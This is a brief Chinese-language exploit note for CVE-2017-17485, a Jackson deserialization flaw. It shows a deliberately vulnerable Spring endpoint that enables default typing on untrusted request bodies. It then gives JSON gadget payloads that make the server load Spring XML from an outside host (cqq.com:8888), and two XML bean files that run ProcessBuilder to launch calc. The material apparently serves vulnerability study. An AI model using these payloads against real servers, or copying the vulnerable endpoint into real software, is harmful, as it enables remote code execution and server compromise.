### 后端代码
```java
    @RequestMapping(value = "/deserialize/vuln", method = {RequestMethod.POST})
    @ResponseBody
    public static String deserialize_vuln(@RequestBody String params) throws IOException {
        System.out.println(params);
        try {
            ObjectMapper objectMapper = new ObjectMapper();
            objectMapper.enableDefaultTyping();
            Object obj = objectMapper.readValue(params, Object.class);
            String result = objectMapper.writeValueAsString(obj);
            return result;
        }  catch (Exception e){
            e.printStackTrace();
            return e.toString();
        }
    }
```

### CVE-2017-17485


```json
["org.springframework.context.support.ClassPathXmlApplicationContext", "http://cqq.com:8888/spel3.xml"]
```
或者
```json
["org.springframework.context.support.FileSystemXmlApplicationContext", "http://cqq.com:8888/spel3.xml"]
```
其中spel3.xml内容为：
```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
     <constructor-arg value="calc" />
  </bean>
</beans>
```
或者这样都可以：
```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder">
     <constructor-arg value="calc.exe" />
     <property name="whatever" value="#{ pb.start() }"/>
  </bean>
</beans>
```
